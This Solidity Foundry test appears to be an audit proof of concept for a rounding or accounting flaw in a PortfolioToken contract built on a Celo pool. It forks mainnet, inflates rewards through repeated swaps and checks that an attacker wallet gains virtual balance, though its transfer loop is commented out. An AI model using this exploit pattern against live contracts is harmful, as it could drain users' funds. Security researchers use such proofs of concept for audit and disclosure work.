// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test, console } from "forge-std/Test.sol";

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import { IPool } from "../contracts/interfaces/IPool.sol";
import { PortfolioToken } from "../contracts/PortfolioToken.sol";

interface IPoolLike is IPool {
    function setFeeShare(uint16 feeShareBp_) external;
    function swapToVUsd(address user, uint256 amount, bool zeroFee) external;
    function swapFromVUsd(
        address user,
        uint256 amount,
        uint256 receiveAmountMin,
        bool zeroFee
    )
        external;
}

/// @custom:command forge test --match-contract L02Test
contract L02Test is Test {
    uint256 celoFork;
    IERC20 usdt = IERC20(0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e);
    IPoolLike pool = IPoolLike(0xfb2C7c10e731EBe96Dabdf4A96D656Bfe8e2b5Af);
    address poolOwner = 0x01a494079DCB715f622340301463cE50cd69A4D0;
    address poolRouter = 0x80858f5F8EFD2Ab6485Aba1A0B9557ED46C6ba0e;
    PortfolioToken cyd;

    address wallet1 = makeAddr("wallet1");
    address wallet2 = makeAddr("wallet2");

    function setUp() external {
        vm.createSelectFork("https://rpc.ankr.com/celo", 41797712);
        cyd = new PortfolioToken("CYD", "CYD");
        cyd.setPool(0, pool);

        vm.label(address(usdt), "USDT");
        vm.label(address(pool), "Pool");
        vm.label(address(cyd), "PortfolioToken");

        // Increase initial LP
        // deal(address(usdt), address(this), 1_000_000 * 1e6);
        // usdt.approve(address(cyd), 1_000_000 * 1e6);
        // cyd.deposit(1_000_000 * 1e6, 0);

        // Setup balances
        uint256 amount = 1_000 * 1e6;
        deal(address(usdt), wallet1, amount);

        // Setup approvals
        vm.prank(wallet1);
        usdt.approve(address(cyd), amount);
    }

    function roundtripSwap() internal {
        uint256 assetAmount = 1000 * 1e6;
        uint256 vUsdAmount = assetAmount / 1000;

        deal(address(usdt), poolRouter, assetAmount);

        // Asset -> vUSD
        vm.prank(poolRouter);
        usdt.approve(address(pool), assetAmount);
        vm.prank(poolRouter);
        pool.swapToVUsd(poolRouter, assetAmount, false);

        // vUSD -> Asset
        vm.prank(poolRouter);
        pool.swapFromVUsd(poolRouter, vUsdAmount, 0, false);
    }

    // Generates rewards in the pool, causing the virtual supply to increase.
    function createRewards() internal {
        for (uint256 i = 0; i < 50; i++) {
            roundtripSwap();
        }
    }

    function test_poc() external {
        uint256 amount = 1_000 * 1e6;

        // Attacker deposit via wallet1
        vm.prank(wallet1);
        cyd.deposit(amount, 0);
        // This makes the pool generate fees, increasing the virtual supply held by PortfolioToken
        // while the real supply of CYD tokens remains the same.
        createRewards();
        cyd.depositRewards();

        uint256 beforeBalance =
            cyd.subBalanceOf(wallet1, 0) + cyd.subBalanceOf(wallet2, 0);

        // for (uint256 i = 1; i < 500; i++) {
        //     vm.prank(wallet1);
        //     cyd.subTransfer(wallet2, i, 0);

        //     vm.prank(wallet2);
        //     cyd.subTransfer(wallet1, i, 0);
        // }

        uint256 afterBalance =
            cyd.subBalanceOf(wallet1, 0) + cyd.subBalanceOf(wallet2, 0);

        // Assert that exploits works!
        assertGt(afterBalance, beforeBalance);
        console.log(
            "Profit (virtual balance): %d", afterBalance - beforeBalance
        );
    }
}
